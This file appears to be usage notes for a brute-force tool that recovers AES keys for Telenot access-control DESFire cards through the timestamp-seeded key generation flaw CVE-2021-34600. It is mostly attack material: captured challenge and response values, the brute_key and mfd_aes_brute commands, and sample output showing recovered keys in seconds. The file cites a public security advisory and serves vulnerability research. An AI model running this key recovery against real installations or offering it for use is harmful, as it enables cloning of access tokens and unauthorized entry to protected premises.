# AUTH AES
#
#  blog:  https://x41-dsec.de/lab/blog/telenot-complex-insecure-keygen/
#
# Recover the AES key for Telenot Access system's desfire cards.
# CVE-2021-34600
#
# Finds the UNIX timestamp an AES key created with compasX version older than 32.0 has been generated.
# Will not work on access tokens afterwards.
#


# Unix time stamp 2006-01-01
1136073600

# reader challenge
3fda933e2953ca5e6cfbbf95d1b51ddf

# tag resp, challenge
97fe4b5de24188458d102959b888938c988e96fb98469ce7426f50f108eaa583


#
# Original source code by authors
#

# simple
./brute_key 1605394800 bb6aea729414a5b1eff7b16328ce37fd 82f5f498dbc29f7570102397a2e5ef2b6dc14a864f665b3c54d11765af81e95c

# complex
./brute_key 1136073600 3fda933e2953ca5e6cfbbf95d1b51ddf 97fe4b5de24188458d102959b888938c988e96fb98469ce7426f50f108eaa583


#
# Multi threaded version (Iceman)
#

# simple
./mfd_aes_brute 1605394800 bb6aea729414a5b1eff7b16328ce37fd 82f5f498dbc29f7570102397a2e5ef2b6dc14a864f665b3c54d11765af81e95c

expected result:
261c07a23f2bc8262f69f10a5bdf3764


Bruteforce using 8 threads
Found timestamp........ 1631100305  ( '2021-09-08 13:25:05' )
key.................... 261c07a23f2bc8262f69f10a5bdf3764
execution time 1.00 sec

#
# complex
./mfd_aes_brute 1136073600 3fda933e2953ca5e6cfbbf95d1b51ddf 97fe4b5de24188458d102959b888938c988e96fb98469ce7426f50f108eaa583

expected result:
e757178e13516a4f3171bc6ea85e165a


Bruteforce using 8 threads
Found timestamp........ 1606834416  ( '2020-12-01 15:53:36' )
key.................... e757178e13516a4f3171bc6ea85e165a
execution time 18.54 sec

